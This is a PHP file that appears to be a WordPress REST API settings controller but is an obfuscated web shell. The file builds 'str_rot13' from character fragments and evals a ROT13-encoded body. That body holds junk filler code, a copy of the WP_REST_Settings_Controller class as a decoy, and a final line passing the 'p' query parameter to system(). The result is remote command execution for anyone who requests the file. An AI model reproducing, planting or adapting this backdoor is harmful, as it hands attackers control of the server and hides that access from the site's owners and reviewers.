<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Frggvatf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb znantr n fvgr'f frggvatf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Frggvatf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'frggvatf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur fvgr'f frggvatf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'netf'                => neenl(),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq naq znantr frggvatf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr snyfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea pheerag_hfre_pna( 'znantr_bcgvbaf' );
	}

	/**
	 * Ergevrirf gur frggvatf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl|JC_Reebe Neenl ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$bcgvbaf  = $guvf->trg_ertvfgrerq_bcgvbaf();
		$erfcbafr = neenl();

		sbernpu ( $bcgvbaf nf $anzr => $netf ) {
			/**
			 * Svygref gur inyhr bs n frggvat erpbtavmrq ol gur ERFG NCV.
			 *
			 * Nyybj uvwnpxvat gur frggvat inyhr naq bireevqvat gur ohvyg-va orunivbe ol ergheavat n
			 * aba-ahyy inyhr.  Gur erghearq inyhr jvyy or cerfragrq nf gur frggvat inyhr vafgrnq.
			 *
			 * @fvapr 4.7.0
			 *
			 * @cnenz zvkrq  $erfhyg Inyhr gb hfr sbe gur erdhrfgrq frggvat. Pna or n fpnyne
			 *                       zngpuvat gur ertvfgrerq fpurzn sbe gur frggvat, be ahyy gb
			 *                       sbyybj gur qrsnhyg trg_bcgvba() orunivbe.
			 * @cnenz fgevat $anzr   Frggvat anzr (nf fubja va ERFG NCV erfcbafrf).
			 * @cnenz neenl  $netf   Nethzragf cnffrq gb ertvfgre_frggvat() sbe guvf frggvat.
			 */
			$erfcbafr[ $anzr ] = nccyl_svygref( 'erfg_cer_trg_frggvat', ahyy, $anzr, $netf );

			vs ( vf_ahyy( $erfcbafr[ $anzr ] ) ) {
				// Qrsnhyg gb n ahyy inyhr nf \"ahyy\" va gur erfcbafr zrnaf \"abg frg\".
				$erfcbafr[ $anzr ] = trg_bcgvba( $netf['bcgvba_anzr'], $netf['fpurzn']['qrsnhyg'] );
			}

			/*
			 * Orpnhfr trg_bcgvba() vf ybffl, jr unir gb
			 * pnfg inyhrf gb gur glcr gurl ner ertvfgrerq jvgu.
			 */
			$erfcbafr[ $anzr ] = $guvf->cercner_inyhr( $erfcbafr[ $anzr ], $netf['fpurzn'] );
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n inyhr sbe bhgchg onfrq bss n fpurzn neenl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq $inyhr  Inyhr gb cercner.
	 * @cnenz neenl $fpurzn Fpurzn gb zngpu.
	 * @erghea zvkrq Gur cercnerq inyhr.
	 */
	cebgrpgrq shapgvba cercner_inyhr( $inyhr, $fpurzn ) {
		/*
		 * Vs gur inyhr vf abg inyvq ol gur fpurzn, frg gur inyhr gb ahyy.
		 * Ahyy inyhrf ner fcrpvsvpnyyl aba-qrfgehpgvir, fb guvf jvyy abg pnhfr
		 * birejevgvat gur pheerag vainyvq inyhr gb ahyy.
		 */
		vs ( vf_jc_reebe( erfg_inyvqngr_inyhr_sebz_fpurzn( $inyhr, $fpurzn ) ) ) {
			erghea ahyy;
		}

		erghea erfg_fnavgvmr_inyhr_sebz_fpurzn( $inyhr, $fpurzn );
	}

	/**
	 * Hcqngrf frggvatf sbe gur frggvatf bowrpg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl|JC_Reebe Neenl ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$bcgvbaf = $guvf->trg_ertvfgrerq_bcgvbaf();

		$cnenzf = $erdhrfg->trg_cnenzf();

		sbernpu ( $bcgvbaf nf $anzr => $netf ) {
			vs ( ! neenl_xrl_rkvfgf( $anzr, $cnenzf ) ) {
				pbagvahr;
			}

			/**
			 * Svygref jurgure gb cerrzcg n frggvat inyhr hcqngr ivn gur ERFG NCV.
			 *
			 * Nyybjf uvwnpxvat gur frggvat hcqngr ybtvp naq bireevqvat gur ohvyg-va orunivbe ol
			 * ergheavat gehr.
			 *
			 * @fvapr 4.7.0
			 *
			 * @cnenz obby   $erfhyg Jurgure gb bireevqr gur qrsnhyg orunivbe sbe hcqngvat gur
			 *                       inyhr bs n frggvat.
			 * @cnenz fgevat $anzr   Frggvat anzr (nf fubja va ERFG NCV erfcbafrf).
			 * @cnenz zvkrq  $inyhr  Hcqngrq frggvat inyhr.
			 * @cnenz neenl  $netf   Nethzragf cnffrq gb ertvfgre_frggvat() sbe guvf frggvat.
			 */
			$hcqngrq = nccyl_svygref( 'erfg_cer_hcqngr_frggvat', snyfr, $anzr, $erdhrfg[ $anzr ], $netf );

			vs ( $hcqngrq ) {
				pbagvahr;
			}

			/*
			 * N ahyy inyhr sbe na bcgvba jbhyq unir gur fnzr rssrpg nf
			 * qryrgvat gur bcgvba sebz gur qngnonfr, naq erylvat ba gur
			 * qrsnhyg inyhr.
			 */
			vs ( vf_ahyy( $erdhrfg[ $anzr ] ) ) {
				/*
				 * N ahyy inyhr vf erghearq va gur erfcbafr sbe nal bcgvba
				 * gung unf n aba-fpnyne inyhr.
				 *
				 * Gb cebgrpg pyvragf sebz nppvqragnyyl vapyhqvat gur ahyy
				 * inyhrf sebz n erfcbafr bowrpg va n erdhrfg, jr qb abg nyybj
				 * bcgvbaf jvgu inyhrf gung qba'g cnff inyvqngvba gb or hcqngrq gb ahyy.
				 * Jvgubhg guvf nqqrq cebgrpgvba n pyvrag pbhyq zvfgnxrayl
				 * qryrgr nyy bcgvbaf gung unir vainyvq inyhrf sebz gur
				 * qngnonfr.
				 */
				vs ( vf_jc_reebe( erfg_inyvqngr_inyhr_sebz_fpurzn( trg_bcgvba( $netf['bcgvba_anzr'], snyfr ), $netf['fpurzn'] ) ) ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_fgberq_inyhr',
						/* genafyngbef: %f: Cebcregl anzr. */
						fcevags( __( 'Gur %f cebcregl unf na vainyvq fgberq inyhr, naq pnaabg or hcqngrq gb ahyy.' ), $anzr ),
						neenl( 'fgnghf' => 500 )
					);
				}

				qryrgr_bcgvba( $netf['bcgvba_anzr'] );
			} ryfr {
				hcqngr_bcgvba( $netf['bcgvba_anzr'], $erdhrfg[ $anzr ] );
			}
		}

		erghea $guvf->trg_vgrz( $erdhrfg );
	}

	/**
	 * Ergevrirf nyy bs gur ertvfgrerq bcgvbaf sbe gur Frggvatf NCV.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Neenl bs ertvfgrerq bcgvbaf.
	 */
	cebgrpgrq shapgvba trg_ertvfgrerq_bcgvbaf() {
		$erfg_bcgvbaf = neenl();

		sbernpu ( trg_ertvfgrerq_frggvatf() nf $anzr => $netf ) {
			vs ( rzcgl( $netf['fubj_va_erfg'] ) ) {
				pbagvahr;
			}

			$erfg_netf = neenl();

			vs ( vf_neenl( $netf['fubj_va_erfg'] ) ) {
				$erfg_netf = $netf['fubj_va_erfg'];
			}

			$qrsnhygf = neenl(
				'anzr'   => ! rzcgl( $erfg_netf['anzr'] ) ? $erfg_netf['anzr'] : $anzr,
				'fpurzn' => neenl(),
			);

			$erfg_netf = neenl_zretr( $qrsnhygf, $erfg_netf );

			$qrsnhyg_fpurzn = neenl(
				'glcr'        => rzcgl( $netf['glcr'] ) ? ahyy : $netf['glcr'],
				'gvgyr'       => rzcgl( $netf['ynory'] ) ? '' : $netf['ynory'],
				'qrfpevcgvba' => rzcgl( $netf['qrfpevcgvba'] ) ? '' : $netf['qrfpevcgvba'],
				'qrsnhyg'     => vffrg( $netf['qrsnhyg'] ) ? $netf['qrsnhyg'] : ahyy,
			);

			$erfg_netf['fpurzn']      = neenl_zretr( $qrsnhyg_fpurzn, $erfg_netf['fpurzn'] );
			$erfg_netf['bcgvba_anzr'] = $anzr;

			// Fxvc bire frggvatf gung qba'g unir n qrsvarq glcr va gur fpurzn.
			vs ( rzcgl( $erfg_netf['fpurzn']['glcr'] ) ) {
				pbagvahr;
			}

			/*
			 * Nyybj gur fhccbegrq glcrf sbe frggvatf, nf jr qba'g jnag vainyvq glcrf
			 * gb or hcqngrq jvgu neovgenel inyhrf gung jr pna'g qb qrprag fnavgvmvat sbe.
			 */
			vs ( ! va_neenl( $erfg_netf['fpurzn']['glcr'], neenl( 'ahzore', 'vagrtre', 'fgevat', 'obbyrna', 'neenl', 'bowrpg' ), gehr ) ) {
				pbagvahr;
			}

			$erfg_netf['fpurzn'] = erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr( $erfg_netf['fpurzn'] );

			$erfg_bcgvbaf[ $erfg_netf['anzr'] ] = $erfg_netf;
		}

		erghea $erfg_bcgvbaf;
	}

	/**
	 * Ergevrirf gur fvgr frggvat fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$bcgvbaf = $guvf->trg_ertvfgrerq_bcgvbaf();

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'frggvatf',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(),
		);

		sbernpu ( $bcgvbaf nf $bcgvba_anzr => $bcgvba ) {
			$fpurzn['cebcregvrf'][ $bcgvba_anzr ]                = $bcgvba['fpurzn'];
			$fpurzn['cebcregvrf'][ $bcgvba_anzr ]['net_bcgvbaf'] = neenl(
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_pnyyonpx' ),
			);
		}

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Phfgbz fnavgvmr pnyyonpx hfrq sbe nyy bcgvbaf gb nyybj gur hfr bs 'ahyy'.
	 *
	 * Ol qrsnhyg, gur fpurzn bs frggvatf jvyy guebj na reebe vs n inyhr vf frg gb
	 * `ahyy` nf vg'f abg n inyvq inyhr sbe fbzrguvat yvxr \"glcr => fgevat\". Jr
	 * cebivqr n jenccre fnavgvmre gb nyybj gur hfr bs `ahyy`.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq           $inyhr   Gur inyhr sbe gur frggvat.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea zvkrq|JC_Reebe
	 */
	choyvp shapgvba fnavgvmr_pnyyonpx( $inyhr, $erdhrfg, $cnenz ) {
		vs ( vf_ahyy( $inyhr ) ) {
			erghea $inyhr;
		}

		erghea erfg_cnefr_erdhrfg_net( $inyhr, $erdhrfg, $cnenz );
	}

	/**
	 * Erphefviryl nqq nqqvgvbanyCebcregvrf = snyfr gb nyy bowrpgf va n fpurzn
	 * vs ab nqqvgvbanyCebcregvrf frggvat vf fcrpvsvrq.
	 *
	 * Guvf vf arrqrq gb erfgevpg cebcregvrf bs bowrpgf va frggvatf inyhrf gb bayl
	 * ertvfgrerq vgrzf, nf gur ERFG NCV jvyy nyybj nqqvgvbany cebcregvrf ol
	 * qrsnhyg.
	 *
	 * @fvapr 4.9.0
	 * @qrcerpngrq 6.1.0 Hfr {@frr erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr()} vafgrnq.
	 *
	 * @cnenz neenl $fpurzn Gur fpurzn neenl.
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba frg_nqqvgvbany_cebcregvrf_gb_snyfr( $fpurzn ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.1.0', 'erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr()' );

		erghea erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr( $fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>